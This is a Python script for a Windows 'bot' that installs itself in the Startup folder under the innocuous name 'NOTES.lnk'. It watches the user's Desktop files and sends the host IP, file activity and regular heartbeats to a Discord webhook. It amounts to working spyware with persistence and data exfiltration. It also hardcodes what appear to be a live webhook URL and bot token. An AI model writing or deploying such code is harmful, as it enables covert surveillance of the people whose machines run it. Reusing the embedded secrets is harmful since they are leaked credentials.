import os
import subprocess
import psutil
import socket
import time
import logging
import requests
import pystray
import threading
from PIL import Image
import socket
import platform
from discord_webhook import DiscordWebhook
import discord
import keyboard
from discord_module import DiscordHandler
from file_monitor import start_file_monitoring 


def initialize():
    global DISCORD_WEBHOOK_URL, DISCORD_BOT_TOKEN, CLOSE_ICON_PATH, DIRECTORY_TO_MONITOR, SCRIPT_SHORTCUT_NAME, FLAG_FILE_PATH
    global COMMAND_PREFIX,CREATOR_DIRECTORY ,DESKTOP_MONITOR_PATH
    global discord_handler ,host_ip
    """CREATOR_DIRECTORY: This variable represents the directory path where the creator of the bot intends to store or manage certain files or resources. For example, if the bot creates log files, temporary files, or stores downloaded content, it might place them in this directory. The value "/path/to/your/directory" is a placeholder, indicating that the specific directory path should be provided by the user of the script. Users need to replace "/path/to/your/directory" with the actual directory path where they want the bot to manage files.

    DISCORD_BOT_COMMAND_PREFIX: This variable represents the character or string that precedes bot commands in Discord messages. For instance, if the bot is programmed to respond to messages starting with !, then DISCORD_BOT_COMMAND_PREFIX is set to '!'. If the bot is configured to respond to messages starting with a different character or string (such as '.' or '/'), this variable holds that specific prefix."""
    CREATOR_DIRECTORY = "/path/to/your/directory"
    COMMAND_PREFIX = '!'
    DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1167795441220460574/uIb8VBmgbM41RcWNe2yFowlrkm_n5yIFavDkN9L5ka5KbWNBwey6_AxCSkSWxRXyfmGU"
    DISCORD_BOT_TOKEN = "MTE3MTA2MzgxMzU1OTMwODM1OA.GU7sNP.IBaEgDi9BLVmKEWqpA0mX1Qsi4fGe8JenkhwWk"
    CLOSE_ICON_PATH = 'path/to/close_icon.png'
    DIRECTORY_TO_MONITOR = 'path/to/your/directory'
    SCRIPT_SHORTCUT_NAME = 'Your_Script_Shortcut.lnk'
    FLAG_FILE_PATH = 'path/to/run_forever_flag.txt'
    discord_handler = DiscordHandler(DISCORD_WEBHOOK_URL)

    DESKTOP_MONITOR_PATH = os.path.join(os.path.join(os.environ["USERPROFILE"]), "Desktop")
    host_ip = socket.gethostbyname(socket.gethostname())
    discord_handler.send_embed({
        "title": "BOT started",
        "description": f"Time: {get_current_time()}, was_first_time? :{CFTA()}, Host_ip: {host_ip}",
        "color": 0x00ff00
    })
    
def CFTA():
    return not os.path.exists(FLAG_FILE_PATH)

def check_first_time_activation():
    if not os.path.exists(FLAG_FILE_PATH):
        with open(FLAG_FILE_PATH, "w") as flag_file:
            flag_file.write("This flag file indicates that the script should run forever.")
        add_to_startup()

def remove_from_startup():
    startup_shortcut_path = os.path.join(os.environ["APPDATA"], "Microsoft\\Windows\\Start Menu\\Programs\\Startup", "Your_Script_Shortcut.lnk")
    if os.path.exists(startup_shortcut_path):
        try:
            os.remove(startup_shortcut_path)
            print("Script removed from startup successfully.")
            message = "Script removed from startup successfully."
        except Exception as e:
            print(f"Error: {e}")
            message =f"Error while remove from startup: {e}"
    else:
        print("Script is not in startup.")
        message = f"Script is not in startup. was it first time activation?:{CFTA()}"

    discord_handler.send_text_message(message)

def add_to_startup():
    try:
        startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
        shortcut_path = os.path.join(startup_folder, "NOTES.lnk")

        if not os.path.exists(startup_folder):
            os.makedirs(startup_folder)

        if not os.path.exists(shortcut_path):
            target_path = os.path.abspath(__file__)
            powershell_command = f"""
                $targetPath = "{target_path}"
                $shortcutPath = "{shortcut_path}"
                $WScriptShell = New-Object -ComObject WScript.Shell
                $Shortcut = $WScriptShell.CreateShortcut($shortcutPath)
                $Shortcut.TargetPath = $targetPath
                $Shortcut.Save()
                """
            subprocess.run(["powershell", "-Command", powershell_command])
            print("Shortcut created successfully in the startup folder.")
        else:
            print("Shortcut already exists in the startup folder.")
    except Exception as e:
        print(f"An error occurred: {e}")



def get_current_time():
    return time.strftime("%Y-%m-%d %H:%M:%S")

def Monitor_file():
    monitored_folder = os.path.expanduser("~/Desktop")  # Monitor the desktop folder
    file_monitor_thread = threading.Thread(target=start_file_monitoring, args=(DISCORD_WEBHOOK_URL, monitored_folder))
    file_monitor_thread.daemon = True  # The thread will exit when the main program exits
    file_monitor_thread.start()

def send_periodic_info_to_discord():
    while True:
        try:
            current_time = time.strftime('%Y-%m-%d %H:%M:%S')
            message = f"Script activated at: {current_time}"
            discord_handler.send_text_message(message)
            print("Message sent to Discord.")
            time.sleep(60*5)  # Wait for 60 seconds before sending the next message
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(60)  # Wait for 60 seconds before retrying in case of an error


def stop_program():
    print("Stopping the program...")
    discord_handler.send_embed({
        "title": "BOT is terminating its self ",
        "description": f"Time: {get_current_time()}, Host_ip: {host_ip}",
        "color": 0xFF0000
    })


    # Clean up tasks or resources if needed before exiting
    exit()


def MAIN():
    check_first_time_activation()
    keyboard.add_hotkey('ctrl+alt+f12', stop_program) # it is initilizing the keyboard 
    initialize()
    Monitor_file()
    send_periodic_info_to_discord() # type of forever loop 










if __name__ == "__main__":
    try:
        MAIN()
    except Exception as e:
        print(f"fatal error occurred: {str(e)}")
        try:
            discord_handler.send_text_message(f"fatal error occurred: {str(e)}")
            print(f"fatal error occurred: {str(e)} So starting again ")
            MAIN()
        except Exception as e:
            print(f"during handling error before fatal error occurred again : {str(e)}")




        

            




